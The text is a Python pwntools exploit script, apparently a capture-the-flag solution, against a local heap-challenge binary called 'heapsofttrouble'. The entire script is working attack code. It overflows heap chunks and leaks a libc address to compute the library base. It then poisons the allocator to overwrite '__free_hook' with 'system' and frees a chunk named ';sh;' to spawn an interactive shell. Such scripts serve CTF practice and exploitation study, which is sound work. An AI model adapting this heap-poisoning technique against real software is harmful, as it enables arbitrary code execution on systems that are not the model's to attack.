from pwn import *

p = process("./heapsofttrouble",env = {'LD_PRELOAD':"./libc.so.6"})
libc = ELF("./libc.so.6")

#p = process("./heapsofttrouble")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
p.sendlineafter("Login: ","nam")

def delete(name):
	p.sendline("2")
	p.sendlineafter("Matrix: ",name)

def create(name):
	p.sendline("1")
	p.sendlineafter("Matrix: ",name)
	p.sendlineafter("to new matrix:","1")
	return name

def overflow(payload):
	p.sendline("7")
	p.sendline(payload)

def showAll():
	p.sendlineafter("Exit\n","5")
	data = p.recvuntil('Human Population:')
	return data

for i in range(0,0x10):
	delete("Matrix #%d"%i)

for i in range(0,6):
	create("A #%d" %i)

payload = "A"*0x28 + '\x21' + '\x04' + '\x01'  + '\x00'*5 + "A"*8 + '\x00'
overflow(payload)

for i in range(0,37):
	overflow("B"*0x20)

overflow("C"*0x20)

overflow("F"*0x20)

overflow("E"*0x20)

delete("A"*8)

matrix_LEAK = create("LEAK@@")

leak = showAll().split("Matrix [")[2].split(']')[0] + '\x7f'
libc_base = u64(leak.ljust(8,'\x00')) - 0x1b9a40#0x1ebbe0 0x1b9a40
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']


print '[+] libc_base : ' + hex(libc_base)
print "[+] free_hook : " + hex(free_hook)

delete("A #2")
delete("A #5")


overflow("A"*0x20)

overflow("A"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)

overflow("B"*0x20)



payload = "C"*0x20 + p64(free_hook | 0x0000000000000000)
payload = payload[0:0x26] 


delete("LEAK@@")


overflow("A"*0x20)
overflow(payload)

overflow("A"*0x20)
overflow("A"*0x20)
create("new1")
create("new2")
create(p64(system))
delete(";sh;")
#gdb.attach(p,"x/20gx matrixes")

#overflow("AA")


p.interactive()